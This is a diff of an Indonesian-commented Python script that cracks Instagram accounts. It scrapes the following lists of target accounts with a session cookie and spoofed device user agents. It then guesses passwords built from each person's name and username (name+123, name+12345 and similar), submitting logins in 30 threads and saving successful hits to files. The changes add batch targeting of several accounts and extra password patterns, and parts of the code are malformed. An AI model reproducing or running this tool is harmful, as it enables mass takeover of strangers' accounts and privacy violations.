@@ -129,9 +129,9 @@ def ua_rozha():
     rr = random.randint
     rc = random.choice
     real = str(rc(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","SM-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT"]))
-    me = str(rc(["vivo 1939", "vivo 1907", "vivo 1820", "vivo Y55A", "vivo Xplay6", "vivo Y66i A", "V1941A", "V2043", "V2061"]))
+    me = str(rc(["V2027", "V1809A", "V2221", "vivo 1901", "vivo 1613", "vivo 1723", "vivo 1918", "vivo 1814"]))
     com = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"]))
-    comi = str(rc(["en_GB","en_US","ar_LY","ru_RU"]))
+    comi = str(rc(["en_GB","en_US","ar_LY"]))
     dpi = str(rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
     pxl = str(rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
     igv = ("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
@@ -256,7 +256,9 @@ def login():
 
 ###---[ CONVERT ID ]---###
 def get_id(user,cok):
-	try:akun = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={user}",cookies=cok,headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}).json()['data']['user'];id = akun['id'];nama = akun['full_name']
+	try:
+		akun = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={user}",cookies=cok,headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}).json()['data']['user'];
+		id = akun['id'];nama = akun['full_name']
 	except:print("COOKES NOT WORK ");time.sleep(2);back()
 	return id,nama
 
@@ -537,49 +539,73 @@ class Pengikut:
 		
 ###---[ DUMP MENGIKUTI ]---###
 class Mengikuti:
-	def __init__(self,cookie):
-		self.r = requests.Session()
-		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
-		self.cok = {'cookie':cookie}
-		self.dump()
-	
-	def dump(self):
-		prints(Panel(f'\t    [{ran_rich}!{P2}] INSTAGRAM USER CRACKED',padding=(0,9),style="bold white"))
-		user = input(f' [{C}?{P}] user : ')
-		if "https" in user or "instagram" in user:
-			user = user.split("/")[3].split("?")[0]
-		else:
-			user = user
-		self.id,na = get_id(user,self.cok)
-		print(f' [{C}!{P}] NAME : {na}\n [{C}!{P}] USER : {self.id}')
-		try:
-			link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100",headers=self.hd,cookies=self.cok).json()
-			for x in link['users']:
-				if len(x['full_name'])<=3:pass
-				else:dump.append(x['username']+'|'+x['full_name'])
-			self.max = link['next_max_id']
-			self.main_dump()
-		except KeyboardInterrupt:
-			print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
-		except Exception as e:
-			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
-			else:print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
-		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
-		atur_sandi()
-		
-	def main_dump(self):
-		try:
-			link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100&max_id={self.max}",headers=self.hd,cookies=self.cok).json()
-			for x in link['users']:
-				if len(x['full_name'])<=3:pass
-				else:
-					if x['username']+'|'+x['full_name'] in dump:pass
-					else:dump.append(x['username']+'|'+x['full_name'])
-					print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end='')
-					sys.stdout.flush()
-			self.max = link['next_max_id']
-			self.main_dump()
-		except Exception as e:pass
+    def __init__(self, cookie):
+        self.r = requests.Session()
+        self.hd = {
+            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3",
+            "x-ig-app-id": '936619743392459'
+        }
+        self.cok = {'cookie': cookie}
+        self.dump()
+
+    def dump(self):
+        prints(Panel(f'\t    [{ran_rich}!{P2}] INSTAGRAM USER CRACKED', padding=(0, 9), style="bold white"))
+        limit = int(input("Total Accounts: "))
+        jumlah = []  # Initialize the list outside the loop
+        for x in range(0, limit):
+            user = input(f' [{C}?{P}] user : ')
+            jumlah.append(user)
+
+        for user in jumlah:
+            if "https" in user or "instagram" in user:
+                user = user.split("/")[3].split("?")[0]
+            else:
+                user = user
+            self.id, na = get_id(user, self.cok)
+            print(f' [{C}!{P}] NAME : {na}\n [{C}!{P}] USER : {self.id}')
+            try:
+                link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100", headers=self.hd, cookies=self.cok).json()
+                for x in link['users']:
+                    if len(x['full_name']) <= 3:
+                        pass
+                    else:
+                        dump.append(x['username'] + '|' + x['full_name'])
+                self.max = link['next_max_id']
+                self.main_dump()
+            except KeyboardInterrupt:
+                print('\r [%s!%s] dump : %s' % (C, P, len(dump)))
+                atur_sandi()
+            except Exception as e:
+                if len(dump) <= 100:
+                    print('gagal dump')
+                    time.sleep(2)
+                    back()
+                else:
+                    print('\r [%s!%s] dump : %s' % (C, P, len(dump)))
+                    atur_sandi()
+            print('\r [%s!%s] dump : %s' % (C, P, len(dump)))
+
+        atur_sandi()
+
+    def main_dump(self):
+        try:
+            link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100&max_id={self.max}", headers=self.hd, cookies=self.cok).json()
+            for x in link['users']:
+                if len(x['full_name']) <= 3:
+                    pass
+                else:
+                    if x['username'] + '|' + x['full_name'] in dump:
+                        pass
+                    else:
+                        dump.append(x['username'] + '|' + x['full_name'])
+                        print('\r [%s!%s] dump : %s' % (C, P, len(dump)), end='')
+                        sys.stdout.flush()
+            self.max = link['next_max_id']
+            self.main_dump()
+        except Exception as e:
+            pass
+
+
 		
 ###---[ DUMP PENCARIAN ]---##$
 class Pencarian:
@@ -612,74 +638,82 @@ class Pencarian:
 
 ###---[ BAGIAN SANDI ]---###
 def atur_sandi():
-	global prog, des
-	tampung = []
-	for x in dump: tampung.append(x)
-	dump.clear()
-	for x in tampung:xx = random.randint(0,len(dump));dump.insert(xx,x)
-	prints(Panel(f'        [{ran_rich}?{P2}] API / REGULAR ({H2}A{P2}/{K2}R{P2})',title=f'{M2}•{K2}•{H2}•{P2} METODE {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
-	metode = input(f" [{C}?{P}] METHOD : ")
-	prints(Panel(f'\t\t     [bold][{ran_rich}01{P2}]. nama, 123, 12345\n\t\t     [{ran_rich}02{P2}]. nama, 123, 1234, 12345\n\t\t     [{ran_rich}03{P2}]. nama, 123, 1234, 12345, 123456\n\t\t     [{ran_rich}04{P2}]. custom password manual',title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,5),style="bold white"))
-	apa = input(f" [{C}?{P}] PASSWORD : ")
-	if apa in ["4","04","5","05"]:
-		prints(Panel(f" [{ran_rich}?{P2}] masukan sandi manual anda, contoh '{K2}bismillah{P2}' gunakan koma",title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
-		manual = input(f" [{C}?{P}] sandi : ").split(",")
-		prints(Panel(f"  [{ran_rich}?{P2}] masukan sandi belakang nama, contoh '{K2}1234{P2}' gunakan koma",title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
-		bk = input(f" [{C}?{P}] sandi : ").split(",")
-	prints(Panel(f' [{ran_rich}?{P2}] INFORMATION ({K2}OK/NO{P2}) ({H2}O{P2}/{M2}N{P2})',title=f'{M2}•{K2}•{H2}•{P2} INFO {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
-	bbz = input(f' [{C}?{P}] pilih  : ')
-	if bbz in ['o','1','01','yy','O','oO']: pilih_info.append("yes")
-	else: pilih_info.append("no")
-	tanggal = f"{hari}-{bulan}-{tahun}.txt"
-	prints(Panel(f'\t\t   OK IN : {H2}STAROZ/OK-{tanggal}{P2}\n\t\t   CP IN : {K2}STAROZ/CP-{tanggal}{P2}',padding=(0,5),style="bold white"))
-	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
-	des = prog.add_task('',total=len(dump))
-	with prog:
-		with ThreadPoolExecutor (max_workers=30) as babas:
-			for akun in dump:
-				user,nama = akun.split('|')[0], akun.split('|')[1].lower()
-				dp = nama.split(' ')[0]
-				full = nama.replace(" ", "")
-				dp2 = nama.split(' ')[1] if len(nama.split(' ')) > 1 else None
+    global prog, des
+    tampung = []
+    for x in dump:
+        tampung.append(x)
+    dump.clear()
+    for x in tampung:
+        xx = random.randint(0, len(dump))
+        dump.insert(xx, x)
+    prints(Panel(f'        [{ran_rich}?{P2}] API / REGULAR ({H2}A{P2}/{K2}R{P2})', title=f'{M2}•{K2}•{H2}•{P2} METODE {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
+    metode = input(f" [{C}?{P}] METHOD : ")
+    prints(Panel(f'\t\t     [bold][{ran_rich}01{P2}]. nama, 123, 12345\n\t\t     [{ran_rich}02{P2}]. nama, 123, 1234, 12345\n\t\t     [{ran_rich}03{P2}]. nama, 123, 1234, 12345, 123456\n\t\t     [{ran_rich}04{P2}]. custom password manual', title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 5), style="bold white"))
+    apa = input(f" [{C}?{P}] PASSWORD : ")
+    if apa in ["4", "04", "5", "05"]:
+        prints(Panel(f" [{ran_rich}?{P2}] masukan sandi manual anda, contoh '{K2}bismillah{P2}' gunakan koma", title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
+        manual = input(f" [{C}?{P}] sandi : ").split(",")
+        prints(Panel(f"  [{ran_rich}?{P2}] masukan sandi belakang nama, contoh '{K2}1234{P2}' gunakan koma", title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
+        bk = input(f" [{C}?{P}] sandi : ").split(",")
+    prints(Panel(f' [{ran_rich}?{P2}] INFORMATION ({K2}OK/NO{P2}) ({H2}O{P2}/{M2}N{P2})', title=f'{M2}•{K2}•{H2}•{P2} INFO {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
+    bbz = input(f' [{C}?{P}] pilih  : ')
+    if bbz in ['o', '1', '01', 'yy', 'O', 'oO']:
+        pilih_info.append("yes")
+    else:
+        pilih_info.append("no")
+    tanggal = f"{hari}-{bulan}-{tahun}.txt"
+    prints(Panel(f'\t\t   OK IN : {H2}STAROZ/OK-{tanggal}{P2}\n\t\t   CP IN : {K2}STAROZ/CP-{tanggal}{P2}', padding=(0, 5), style="bold white"))
+    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'), TimeElapsedColumn())
+    des = prog.add_task('', total=len(dump))
+    with prog:
+        with ThreadPoolExecutor(max_workers=30) as babas:
+            for akun in dump:
+                user, nama = akun.split('|')[0], akun.split('|')[1].lower()
+                dp = nama.split(' ')[0]
+                dp2 = nama.split(' ')[1] if len(nama.split(' ')) > 1 else None
                 fn = nama.replace(' ', '')
                 res1 = " ".join(re.split("[^a-zA-Z]*", user)).replace(" ","")
                 user2 = res1.lower()
-				if apa in ['1','01']:
-					if len(dp)<3 or len(nama)<5:
-						pwx = [nama.replace(' ','')+'123']
-					else:
-						pwx = [nama,nama.replace(' ',''),dp+'123']
-				elif apa in ['2','02']:
-					if len(dp)<3 or len(nama)<5:
-						pwx = [nama.replace(' ','')+'12345']
-					else:
-						pwx = [nama,nama.replace(' ',''),dp+'12345']
-				elif apa in ['3','03']:
-					if len(dp)<3 or len(nama)<5:
-						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
-				elif dp2 != None:
-                        pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'1',dp+'1122',full+'123',full+'1234',full+'12345',dp+'12',full+'1',full+'12',full+'1122',dp+'12345',dp+'786',user2+'12345',user2+'1234',user2+'123']
-					else:
-						pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'1',dp+'1122',full+'123',full+'1234',full+'12345',dp+'12',full+'1',full+'12',full+'1122',dp+'12345',dp+'786',user2+'12345',user2+'1234',user2+'123']
-				elif apa in ['4','04']:
-					if len(dp)<3 or len(nama)<5:
-						pwx = manual
-					else:
-						kombo = []
-						pwx = [nama.replace(' ',''),nama]+manual
-						for x in bk:kombo.append(str(dp)+str(x))
-						pwx = pwx+kombo
-				else:
-					if len(dp)<3 or len(nama)<5:
-						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
-					else:
-						pwx = [nama.replace(' ',''),dp+'123',dp+'1234',dp+'12345']
-				if metode in ["r","R","regular","Regular"]:
-					babas.submit(Mengheker,user,pwx)
-				else:
-					babas.submit(MetodApi,user,pwx)
-	prints(Panel(f'  [{ran_rich}!{P2}] CRACK INSTAGRAM OK : {H2}{ok}{P2} CP : {K2}{cp}{P2} THANKS.',padding=(0,9),style="bold white"))
-	exit()
+                if apa in ['1', '01']:
+                    if len(dp) < 3 or len(nama) < 5:
+                        pwx = [nama.replace(' ', '') + '123']
+                    else:
+                        pwx = [nama, nama.replace(' ', ''), dp + '123', user +
+                               
+                               "123"]
+                elif apa in ['2', '02']:
+                    if len(dp) < 3 or len(nama) < 5:
+                        pwx = [nama.replace(' ', '') + '12345']
+                    else:
+                        pwx = [nama, nama.replace(' ', ''), dp + '12345']
+                elif apa in ['3', '03']:
+                    if len(dp) < 3 or len(nama) < 5:
+                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
+                    elif dp2 != None:
+                        pwx = [nama, dp2 + "123", dp2 + "1234", dp2 + "12345", dp2 + '1', dp2 + '12']
+                    else:
+                         pwx = [nama, fn + '123', fn + '1', fn + '12', fn + '1122', fn + '1234', fn + '12345', dp + '1', dp + '12', dp + '123', dp + '1234', dp + '12345', dp + '1122', user2, user2 + '123', user2 + '1234', user2 + '12345']   
+                elif apa in ['4', '04']:
+                    if len(dp) < 3 or len(nama) < 5:
+                        pwx = manual
+                    else:
+                        kombo = []
+                        pwx = [nama.replace(' ', ''), nama] + manual
+                        for x in bk:
+                            kombo.append(str(dp) + str(x))
+                        pwx = pwx + kombo
+                else:
+                    if len(dp) < 3 or len(nama) < 5:
+                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
+                    else:
+                        pwx = [nama.replace(' ', ''), dp + '123', dp + '1234', dp + '12345']
+                if metode in ["r", "R", "regular", "Regular"]:
+                    babas.submit(Mengheker, user, pwx)
+                else:
+                    babas.submit(MetodApi, user, pwx)
+    prints(Panel(f'  [{ran_rich}!{P2}] CRACK INSTAGRAM OK : {H2}{ok}{P2} CP : {K2}{cp}{P2} THANKS.', padding=(0, 9), style="bold white"))
+    exit()
+
 
 ###---[ METHODE API ]---###	
 def MetodApi(user,pewe):
